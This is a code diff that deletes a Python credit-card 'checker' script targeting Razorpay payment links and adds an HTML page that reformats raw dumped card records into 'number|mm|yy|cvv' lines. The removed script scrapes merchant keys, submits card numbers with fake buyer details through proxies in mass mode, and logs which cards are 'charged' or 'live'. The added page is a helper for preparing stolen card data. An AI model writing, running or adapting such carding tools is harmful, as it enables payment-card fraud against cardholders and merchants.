@@ -1,624 +1,150 @@
-import requests
-import json
-import time
-import random
-from urllib.parse import urlencode, urlparse, parse_qs, unquote
-from datetime import datetime
-import re
-import os
-import platform
-import string
-from playwright.sync_api import sync_playwright
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CC Data Extractor</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        textarea {
+            width: 100%;
+            height: 200px;
+            margin: 10px 0;
+            font-family: monospace;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            margin-right: 10px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .copy-btn {
+            background-color: #2196F3;
+        }
+        .copy-btn:hover {
+            background-color: #0b7dda;
+        }
+        .output {
+            margin-top: 20px;
+            white-space: pre-wrap;
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            position: relative;
+        }
+        .instructions {
+            background-color: #e7f3fe;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .copy-notification {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: rgba(0,0,0,0.7);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-size: 12px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Credit Card Data Extractor</h1>
 
-PROXY_CONFIG = None
+    <div class="instructions">
+        <h3>Instructions:</h3>
+        <p>Paste your raw credit card data in the input box below. The tool will extract and format:</p>
+        <ul>
+            <li>Credit card number</li>
+            <li>Expiry month (MM)</li>
+            <li>Expiry day (DD)</li>
+            <li>CVV</li>
+        </ul>
+        <p>Example input format that will work:</p>
+        <pre>JONES, CHRISTOPHER VISA  4266 8417 5194 8686 01/28 368 10528</pre>
+        <p>Will output:</p>
+        <pre>4266841751948686|01|28|368</pre>
+    </div>
 
+    <textarea id="inputData" placeholder="Paste your credit card data here..."></textarea>
+    <button onclick="processData()">Extract Data</button>
 
-def generate_device_fingerprint():
-    chars = string.ascii_letters + string.digits
-    return ''.join(random.choice(chars) for _ in range(128))
+    <div class="output" id="outputContainer">
+        <div class="copy-notification" id="copyNotification">Copied to clipboard!</div>
+        <h3>Extracted Output:</h3>
+        <div id="outputData"></div>
+    </div>
 
+    <script>
+        function processData() {
+            const input = document.getElementById('inputData').value;
+            const lines = input.split('\n');
+            let output = '';
 
-DEVICE_FINGERPRINT = generate_device_fingerprint()
+            lines.forEach(line => {
+                if (!line.trim()) return;
 
+                // Remove all spaces
+                const noSpaces = line.replace(/\s+/g, '');
 
-def setup_proxy(proxy_string):
-    if not proxy_string or proxy_string.strip() == "":
-        return None
-    try:
-        parts = proxy_string.strip().split(':')
-        if len(parts) == 4:
-            ip, port, user, pw = [p.strip() for p in parts]
-            if not all([ip, port, user, pw]):
-                return None
-            return {"server": f"http://{ip}:{port}", "username": user, "password": pw}
-        return None
-    except:
-        return None
+                // Split by VISA (or other card type)
+                const parts = noSpaces.split(/VISA|MC|AMEX|DISC/i);
 
+                if (parts.length >= 2) {
+                    const cardData = parts[1];
 
-def get_dynamic_session_token():
-    try:
-        with sync_playwright() as p:
-            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
-            browser = p.chromium.launch(headless=True, proxy=PROXY_CONFIG, args=browser_args)
-            page = browser.new_page()
-            page.set_extra_http_headers({
-                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            })
-            page.goto("https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1", timeout=30000)
-            page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
-            token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
-            browser.close()
-            return (token, None) if token else (None, "Token not found in URL.")
-    except Exception as e:
-        return None, f"Session token error: {str(e)[:100]}"
+                    // Extract components
+                    const cardNumber = cardData.substring(0, 16);
+                    const expiry = cardData.substring(16, 22); // MM/YY
+                    const cvv = cardData.substring(22, 25); // First 3 digits of ID
+                    const id = cardData.substring(25); // Rest of ID
 
+                    // Split expiry into month and day
+                    const expiryMonth = expiry.substring(0, 2);
+                    const expiryDay = expiry.substring(3, 5);
 
-def extract_merchant_data(site_url):
-    merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)
-    merchant_handle = merchant_match.group(1) if merchant_match else None
-
-    try:
-        with sync_playwright() as p:
-            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
-            browser = p.chromium.launch(headless=True, proxy=PROXY_CONFIG, args=browser_args)
-            page = browser.new_page()
-            page.set_extra_http_headers({
-                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            })
-
-            intercepted = {}
-            def on_resp(r):
-                if "api.razorpay.com/v1/payment_links/merchant" in r.url:
-                    try:
-                        intercepted['data'] = r.json()
-                    except:
-                        pass
-
-            page.on("response", on_resp)
-            page.goto(site_url, timeout=45000, wait_until='networkidle')
-            page.wait_for_timeout(3000)
-
-            eval_data = page.evaluate("""() => {
-                const d = window.data || window.__INITIAL_STATE__ || window.__CHECKOUT_DATA__ || window.razorpayData;
-                if (d && d.keyless_header) return d;
-
-                for (let k in window) {
-                    try {
-                        if (window[k] && typeof window[k] === 'object' && window[k].keyless_header) return window[k];
-                    } catch(e) {}
+                    output += `${cardNumber}|${expiryMonth}|${expiryDay}|${cvv}\n`;
+                } else {
+                    output += `// Could not process: ${line}\n`;
                 }
-
-                const scripts = document.querySelectorAll('script');
-                for (let s of scripts) {
-                    const txt = s.textContent || s.innerText;
-                    if (txt.includes('keyless_header') || txt.includes('payment_link')) {
-                        const matches = txt.match(/({[^{}]*(?:{[^{}]*}[^{}]*)*})/g);
-                        if (matches) {
-                            for (let match of matches) {
-                                try {
-                                    const parsed = JSON.parse(match);
-                                    if (parsed.keyless_header || parsed.key_id) return parsed;
-                                } catch (e) {}
-                            }
-                        }
-                    }
-                }
-                return null;
-            }""")
-            browser.close()
-
-            final = eval_data or intercepted.get('data')
-            if final:
-                kh = final.get('keyless_header')
-                kid = final.get('key_id')
-                pl = final.get('payment_link') or final
-
-                if isinstance(pl, str):
-                    try:
-                        pl = json.loads(pl)
-                    except:
-                        pass
-
-                plid = pl.get('id') if isinstance(pl, dict) else final.get('payment_link_id')
-                ppi_list = pl.get('payment_page_items', []) if isinstance(pl, dict) else []
-                ppi = ppi_list[0].get('id') if ppi_list else final.get('payment_page_item_id')
-
-                if kh and kid and plid and ppi:
-                    return kh, kid, plid, ppi, None
-
-            if merchant_handle:
-                try:
-                    api_url = f"https://api.razorpay.com/v1/payment_links/merchant/{merchant_handle}"
-                    response = requests.get(api_url, timeout=10)
-                    if response.status_code == 200:
-                        api_data = response.json()
-                        kh = api_data.get('keyless_header')
-                        kid = api_data.get('key_id')
-                        plid = api_data.get('id')
-                        ppi = api_data.get('payment_page_items', [{}])[0].get('id')
-                        if kh and kid and plid and ppi:
-                            return kh, kid, plid, ppi, None
-                except:
-                    pass
-
-            return None, None, None, None, "Extraction failed."
-    except Exception as e:
-        return None, None, None, None, f"Extraction error: {str(e)[:100]}"
-
-
-def random_user_info():
-    return {
-        "name": "Test User",
-        "email": f"testuser{random.randint(100, 999)}@gmail.com",
-        "phone": f"9876543{random.randint(100, 999)}"
-    }
-
-
-def create_order(session, payment_link_id, amount_paise, payment_page_item_id):
-    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
-    headers = {
-        "Accept": "application/json",
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0"
-    }
-    payload = {
-        "notes": {"comment": ""},
-        "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]
-    }
-    try:
-        resp = session.post(url, headers=headers, json=payload, timeout=15)
-        resp.raise_for_status()
-        return resp.json().get("order", {}).get("id")
-    except:
-        return None
-
-
-def submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url):
-    card_number, exp_month, exp_year, cvv = card_info
-    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
-    params = {
-        "key_id": key_id,
-        "session_token": session_token,
-        "keyless_header": keyless_header
-    }
-    headers = {
-        "x-session-token": session_token,
-        "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": "Mozilla/5.0"
-    }
-    data = {
-        "notes[comment]": "",
-        "payment_link_id": payment_link_id,
-        "key_id": key_id,
-        "contact": f"+91{user_info['phone']}",
-        "email": user_info["email"],
-        "currency": "INR",
-        "_[library]": "checkoutjs",
-        "_[platform]": "browser",
-        "_[referer]": site_url,
-        "amount": amount_paise,
-        "order_id": order_id,
-        "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT,
-        "method": "card",
-        "card[number]": card_number,
-        "card[cvv]": cvv,
-        "card[name]": user_info["name"],
-        "card[expiry_month]": exp_month,
-        "card[expiry_year]": exp_year,
-        "save": "0"
-    }
-    return session.post(url, headers=headers, params=params, data=urlencode(data), timeout=20)
-
-
-def check_payment_status(payment_id, key_id, session_token, keyless_header):
-    headers = {
-        'Accept': '*/*',
-        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        'Connection': 'keep-alive',
-        'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'x-session-token': session_token,
-    }
-    params = {
-        'key_id': key_id,
-        'session_token': session_token,
-        'keyless_header': keyless_header,
-    }
-    try:
-        r = requests.get(
-            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}',
-            params=params, headers=headers, timeout=15
-        )
-        if r.status_code == 200:
-            data = r.json()
-            return data.get('status', 'unknown'), data
-        return 'unknown', {'error': f'Status check failed: {r.status_code}'}
-    except Exception as e:
-        return 'unknown', {'error': f'Status check error: {e}'}
-
-
-def cancel_payment(payment_id, key_id, session_token, keyless_header):
-    headers = {
-        'Accept': '*/*',
-        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        'Connection': 'keep-alive',
-        'Content-type': 'application/x-www-form-urlencoded',
-        'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'x-session-token': session_token,
-    }
-    params = {
-        'key_id': key_id,
-        'session_token': session_token,
-        'keyless_header': keyless_header,
-    }
-    try:
-        r = requests.get(
-            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel',
-            params=params, headers=headers, timeout=15
-        )
-        try:
-            return r.json()
-        except json.JSONDecodeError:
-            return {"error": {"description": f"Cancel HTTP {r.status_code}: {r.text[:200]}"}}
-    except Exception as e:
-        return {"error": {"description": f"Cancel request error: {e}"}}
-
-
-def handle_3ds_redirect(redirect_url):
-    try:
-        with sync_playwright() as p:
-            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
-            browser = p.chromium.launch(headless=True, proxy=PROXY_CONFIG, args=browser_args)
-            page = browser.new_page()
-            page.set_extra_http_headers({
-                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            })
-            page.goto(redirect_url, timeout=45000, wait_until='networkidle')
-
-            html_content = page.content()
-            body_text = page.locator("body").inner_text()
-
-            browser.close()
-
-            if 'razorpay_signature' in html_content or 'payment successful' in body_text.lower():
-                return "SUCCESS"
-
-            return body_text.strip()[:150] if body_text.strip() else "No response text"
-    except Exception as e:
-        return f"3DS error: {str(e)[:80]}"
-
-
-def parse_decline_reason(cancel_data):
-    if isinstance(cancel_data, dict) and "error" in cancel_data:
-        err = cancel_data["error"]
-        if isinstance(err, dict):
-            desc = err.get('description', 'Declined')
-            reason = err.get('reason', '')
-            code = err.get('code', '')
-            desc = desc.replace("%s", "Card")
-            parts = [desc]
-            if reason and reason != 'unknown':
-                parts.append(f"Reason: {reason}")
-            if code and code != 'N/A':
-                parts.append(f"Code: {code}")
-            return " | ".join(parts)
-        return str(err)
-    return json.dumps(cancel_data)[:100] if cancel_data else "Unknown decline reason"
-
-
-def process_card(cc_line, plid, ppiid, kid, kh, stoken, site_url, amount_paise):
-    start = time.time()
-    try:
-        num, mm, yy, cvv = cc_line.strip().split('|')
-    except ValueError:
-        return "SKIP", "Invalid format (need card|mm|yy|cvv)", 0, {}
-
-    session = requests.Session()
-
-    order_id = create_order(session, plid, amount_paise, ppiid)
-    if not order_id:
-        return "FAIL", "Order creation failed", round(time.time() - start, 2), {}
-
-    time.sleep(random.uniform(1, 2))
-
-    try:
-        user_info = random_user_info()
-        response = submit_payment(
-            session, order_id, (num, mm, yy, cvv),
-            user_info, amount_paise, kid, kh, plid, stoken, site_url
-        )
-        pdata = response.json()
-    except Exception as e:
-        return "ERROR", f"Payment submission failed: {str(e)[:60]}", round(time.time() - start, 2), {}
-
-    pid = pdata.get("payment_id") or pdata.get("razorpay_payment_id")
-    if not pid and isinstance(pdata.get("payment"), dict):
-        pid = pdata["payment"].get("id")
-
-    if pdata.get("redirect") == True or pdata.get("type") == "redirect":
-        rurl = pdata.get('request', {}).get('url') if isinstance(pdata.get('request'), dict) else None
-        if rurl and pid:
-            time.sleep(3)
-
-            stat, sdata = check_payment_status(pid, kid, stoken, kh)
-
-            if stat in ['captured', 'authorized']:
-                return "CHARGED", f"ID: {pid} | Status: {stat}", round(time.time() - start, 2), pdata
-
-            if stat == 'failed':
-                reason = "Payment failed"
-                if isinstance(sdata, dict):
-                    err = sdata.get('error_description') or sdata.get('error', {}).get('description', '')
-                    if err:
-                        reason = err
-                return "DECLINED", f"ID: {pid} | {reason}", round(time.time() - start, 2), pdata
-
-            if stat == 'created':
-                return "LIVE", f"ID: {pid} | 3DS/OTP Required (Card is Live)", round(time.time() - start, 2), pdata
-
-            cdata = cancel_payment(pid, kid, stoken, kh)
-            if isinstance(cdata, dict) and "error" in cdata:
-                err = cdata["error"]
-                if isinstance(err, dict):
-                    reason_code = err.get('reason', '')
-                    desc = err.get('description', '')
-                    if reason_code == 'payment_cancelled':
-                        return "LIVE", f"ID: {pid} | 3DS/OTP Required (Card is Live)", round(time.time() - start, 2), pdata
-                    else:
-                        return "DECLINED", f"ID: {pid} | {desc}", round(time.time() - start, 2), pdata
-
-            reason = parse_decline_reason(cdata)
-            return "DECLINED", f"ID: {pid} | {reason}", round(time.time() - start, 2), pdata
-
-        return "FAIL", f"3DS redirect missing URL (pid={pid})", round(time.time() - start, 2), pdata
-
-    if "razorpay_signature" in pdata or "signature" in pdata:
-        sig = pdata.get('razorpay_signature') or pdata.get('signature')
-        return "CHARGED", f"ID: {pid} | Immediate success", round(time.time() - start, 2), pdata
-
-    if "error" in pdata:
-        err = pdata.get('error', {})
-        if isinstance(err, dict):
-            desc = err.get('description', 'Unknown error').replace("%s", "Card")
-            code = err.get('code', 'N/A')
-            reason = err.get('reason', '')
-            msg = f"{desc} (Code: {code})"
-            if reason:
-                msg += f" [Reason: {reason}]"
-            if pid:
-                msg = f"ID: {pid} | {msg}"
-            return "DECLINED", msg, round(time.time() - start, 2), pdata
-        return "DECLINED", f"Error: {json.dumps(err)[:80]}", round(time.time() - start, 2), pdata
-
-    return "UNKNOWN", f"Response: {json.dumps(pdata)[:100]}", round(time.time() - start, 2), pdata
-
-
-def colorize(tag, text):
-    colors = {
-        "CHARGED": "\033[92m",
-        "LIVE": "\033[96m",
-        "DECLINED": "\033[91m",
-        "ERROR": "\033[93m",
-        "FAIL": "\033[93m",
-        "SKIP": "\033[90m",
-        "UNKNOWN": "\033[95m",
-        "RESET": "\033[0m",
-    }
-    c = colors.get(tag, "")
-    r = colors["RESET"]
-    return f"{c}[{tag}]{r} {text}"
-
-
-def show_banner():
-    R = "\033[91m"
-    C = "\033[96m"
-    Y = "\033[93m"
-    M = "\033[95m"
-    X = "\033[0m"
-
-    banner = f"""
-{R}╔══════════════════════════════════════════════════════════════════╗
-║                                                                  ║
-║   {Y} █████╗ ██╗   ██╗████████╗ ██████╗                            {R}║
-║   {Y}██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗                           {R}║
-║   {Y}███████║██║   ██║   ██║   ██║   ██║                            {R}║
-║   {Y}██╔══██║██║   ██║   ██║   ██║   ██║                            {R}║
-║   {Y}██║  ██║╚██████╔╝   ██║   ╚██████╔╝                            {R}║
-║   {Y}╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝                             {R}║
-║                                                                  ║
-║   {C}██████╗  ██████╗ ███████╗███████╗██████╗ ██████╗  █████╗ ██╗   ██╗{R}║
-║   {C}██╔══██╗██╔═══██╗╚══███╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝{R}║
-║   {C}██████╔╝██║   ██║  ███╔╝ █████╗  ██████╔╝██████╔╝███████║ ╚████╔╝ {R}║
-║   {C}██╔══██╗██║   ██║ ███╔╝  ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██║  ╚██╔╝  {R}║
-║   {C}██║  ██║╚██████╔╝███████╗███████╗██║  ██║██║     ██║  ██║   ██║   {R}║
-║   {C}╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   {R}║
-║                                                                  ║
-║{M}  ┌──────────────────────────────────────────────────────────┐    {R}║
-║{M}  │             ★  BY @CyberCoderBD  ★                        │    {R}║
-║{M}  │         FREE SCRIPT — DO NOT SELL                       │    {R}║
-║{M}  │         Telegram: @CyberCoderBD                           │    {R}║
-║{M}  └──────────────────────────────────────────────────────────┘    {R}║
-║                                                                  ║
-╚══════════════════════════════════════════════════════════════════╝{X}
-"""
-    print(banner)
-
-
-def setup_checker():
-    global PROXY_CONFIG
-
-    site = input("  Razorpay Site URL: ").strip()
-    if not site:
-        site = "https://razorpay.me/@thepunjabistore"
-
-    proxy_file = input("  Proxy file path (Enter to skip): ").strip()
-    if proxy_file and os.path.exists(proxy_file):
-        with open(proxy_file, 'r') as f:
-            proxy_line = f.readline().strip()
-        PROXY_CONFIG = setup_proxy(proxy_line)
-        if PROXY_CONFIG:
-            print(f"  [+] Proxy loaded: {PROXY_CONFIG['server']}")
-    elif proxy_file:
-        PROXY_CONFIG = setup_proxy(proxy_file)
-        if PROXY_CONFIG:
-            print(f"  [+] Proxy set: {PROXY_CONFIG['server']}")
-
-    price_input = input("  Amount in Rupees [default: 1]: ").strip()
-    try:
-        amount_rupees = int(price_input) if price_input else 1
-    except ValueError:
-        amount_rupees = 1
-    amount_paise = amount_rupees * 100
-
-    print(f"\n  [~] Setting up... please wait")
-    kh, kid, plid, ppiid, err = extract_merchant_data(site)
-    if err:
-        print(f"  [-] FATAL: {err}")
-        return None
-
-    stoken, err = get_dynamic_session_token()
-    if err:
-        print(f"  [-] FATAL: {err}")
-        return None
-
-    print(f"  [+] Ready!\n")
-    return {
-        "site": site, "kh": kh, "kid": kid, "plid": plid,
-        "ppiid": ppiid, "stoken": stoken, "amount_paise": amount_paise,
-        "amount_rupees": amount_rupees
-    }
-
-
-def single_check(cfg):
-    cc = input("  Enter CC (card|mm|yy|cvv): ").strip()
-    if not cc or '|' not in cc:
-        print("  [!] Invalid format.")
-        return
-
-    masked = f"{cc[:6]}****{cc.split('|')[0][-4:]}" if len(cc) > 15 else cc[:10]
-    print(f"\n  Checking {masked}...\n")
-
-    try:
-        tag, msg, elapsed, full_resp = process_card(
-            cc, cfg["plid"], cfg["ppiid"], cfg["kid"], cfg["kh"],
-            cfg["stoken"], cfg["site"], cfg["amount_paise"]
-        )
-        print(colorize(tag, msg))
-        print(f"\n  Full Response:")
-        print(f"  {json.dumps(full_resp, indent=2)}")
-        print(f"\n  Time: {elapsed}s | @CyberCoderBD")
-
-        if tag == "CHARGED":
-            with open("charged.txt", "a") as f:
-                f.write(f"{cc} | {tag} | {msg} | {datetime.now().isoformat()}\n")
-        elif tag == "LIVE":
-            with open("lives.txt", "a") as f:
-                f.write(f"{cc} | {tag} | {msg} | {datetime.now().isoformat()}\n")
-    except Exception as e:
-        print(colorize("ERROR", str(e)[:80]))
-
-
-def mass_check(cfg):
-    cc_file = input("  CC file path: ").strip()
-    if not cc_file or not os.path.exists(cc_file):
-        print("  [!] File not found.")
-        return
-
-    with open(cc_file, 'r') as f:
-        cards = [line.strip() for line in f if line.strip() and '|' in line]
-
-    if not cards:
-        print("  [!] No valid cards in file.")
-        return
-
-    print(f"\n  Processing {len(cards)} card(s) @ ₹{cfg['amount_rupees']} | @CyberCoderBD\n")
-    print("-" * 65)
-
-    charged = 0
-    live = 0
-    declined = 0
-    errors = 0
-    token_uses = 0
-    stoken = cfg["stoken"]
-
-    for i, cc in enumerate(cards, 1):
-        token_uses += 1
-        if token_uses > 15:
-            new_token, _ = get_dynamic_session_token()
-            if new_token:
-                stoken = new_token
-                token_uses = 0
-
-        masked = f"{cc[:6]}****{cc.split('|')[0][-4:]}" if len(cc) > 15 else cc[:10]
-        print(f"  [{i}/{len(cards)}] {masked} : ", end="", flush=True)
-
-        try:
-            tag, msg, elapsed, _ = process_card(
-                cc, cfg["plid"], cfg["ppiid"], cfg["kid"], cfg["kh"],
-                stoken, cfg["site"], cfg["amount_paise"]
-            )
-            print(colorize(tag, f"{msg}  ({elapsed}s)"))
-
-            if tag == "CHARGED":
-                charged += 1
-                with open("charged.txt", "a") as f:
-                    f.write(f"{cc} | {tag} | {msg} | {datetime.now().isoformat()}\n")
-            elif tag == "LIVE":
-                live += 1
-                with open("lives.txt", "a") as f:
-                    f.write(f"{cc} | {tag} | {msg} | {datetime.now().isoformat()}\n")
-            elif tag == "DECLINED":
-                declined += 1
-            else:
-                errors += 1
-
-        except KeyboardInterrupt:
-            print("\n\n  [!] Stopped.")
-            break
-        except Exception as e:
-            print(colorize("ERROR", str(e)[:60]))
-            errors += 1
-
-        if i < len(cards):
-            time.sleep(random.uniform(0.5, 1.5))
-
-    print("-" * 65)
-    print(f"\n  Results: {charged} charged / {live} live / {declined} declined / {errors} errors")
-    if charged > 0:
-        print(f"  [+] Charged saved to: charged.txt")
-    if live > 0:
-        print(f"  [+] Lives saved to: lives.txt")
-    print(f"\n  @CyberCoderBD\n")
-
-
-def main():
-    show_banner()
-
-    print("  [1] Single Check")
-    print("  [2] Mass Check\n")
-    choice = input("  Select (1/2): ").strip()
-
-    if choice not in ['1', '2']:
-        print("  [!] Invalid choice.")
-        return
-
-    cfg = setup_checker()
-    if not cfg:
-        return
-
-    if choice == '1':
-        single_check(cfg)
-    else:
-        mass_check(cfg)
-
-    print(f"  Script by @CyberCoderBD — FREE, do NOT sell!")
-    print(f"  Telegram: @CyberCoderBD\n")
-
-
-if __name__ == "__main__":
-    main()
+            });
+
+            document.getElementById('outputData').textContent = output;
+        }
+
+        function copyToClipboard() {
+            const outputElement = document.getElementById('outputData');
+            const range = document.createRange();
+            range.selectNode(outputElement);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand('copy');
+            window.getSelection().removeAllRanges();
+
+            // Show notification
+            const notification = document.getElementById('copyNotification');
+            notification.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 2000);
+        }
+    </script>
+
+    <button class="copy-btn" onclick="copyToClipboard()">Copy to Clipboard</button>
+</body>
+</html>
